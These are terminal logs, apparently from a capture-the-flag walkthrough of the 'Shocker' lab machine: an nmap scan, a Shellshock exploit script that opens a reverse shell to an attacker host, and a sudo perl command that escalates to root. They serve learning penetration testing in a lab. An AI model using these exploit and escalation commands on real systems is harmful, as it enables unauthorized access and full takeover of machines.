```
root@kali:~# nmap -p 80,2222 -A 10.10.10.56 
Starting Nmap 7.40 ( https://nmap.org ) at 2017-09-30 15:02 EDT 
Nmap scan report for 10.10.10.56 
Host is up (0.040s latency). 
PORT     STATE SERVICE VERSION 
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu)) 
|_http-server-header: Apache/2.4.18 (Ubuntu) 
|_http-title: Site doesn't have a title (text/html). 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:  
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) 
|_  256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.6 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%), Linux 3.2 (95%) 
No exact OS matches for host (test conditions non-ideal). 
Network Distance: 2 hops 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 

TRACEROUTE (using port 80/tcp) 
HOP RTT      ADDRESS 
1   93.50 ms 10.10.14.1 
2   87.87 ms 10.10.10.56 

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 22.04 seconds 
```

```
root@kali:~# python shock.py payload=reverse rhost=10.10.10.56 lhost=10.10.15.103 lport=1234 pages=/cgi-bin/user.sh 
[!] Started reverse shell handler 
[-] Trying exploit on : /cgi-bin/user.sh 
[!] Successfully exploited 
[!] Incoming connection from 10.10.10.56 
10.10.10.56> id 
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) 
```

```
10.10.10.56> sudo -l 
Matching Defaults entries for shelly on Shocker: 
    env_reset, mail_badpass, 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User shelly may run the following commands on Shocker: 
    (root) NOPASSWD: /usr/bin/perl 

10.10.10.56> sudo -u root /usr/bin/perl —e 'exec "/bin/sh";' 
Can't open perl script "—e": No such file or directory 

10.10.10.56> sudo -u root /usr/bin/perl -e 'exec "/bin/sh";' 
10.10.10.56> id 
uid=0(root) gid=0(root) groups=0(root) 
```
 
